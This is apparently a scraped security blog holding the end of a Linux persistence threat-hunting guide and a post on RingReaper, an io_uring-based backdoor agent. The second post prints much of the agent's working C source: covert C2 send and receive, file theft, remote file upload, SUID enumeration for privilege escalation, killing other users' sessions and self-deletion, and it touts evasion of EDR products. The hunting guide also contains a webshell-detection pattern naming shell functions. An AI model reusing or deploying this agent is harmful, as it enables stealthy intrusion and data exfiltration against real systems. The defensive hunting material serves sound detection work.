attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s 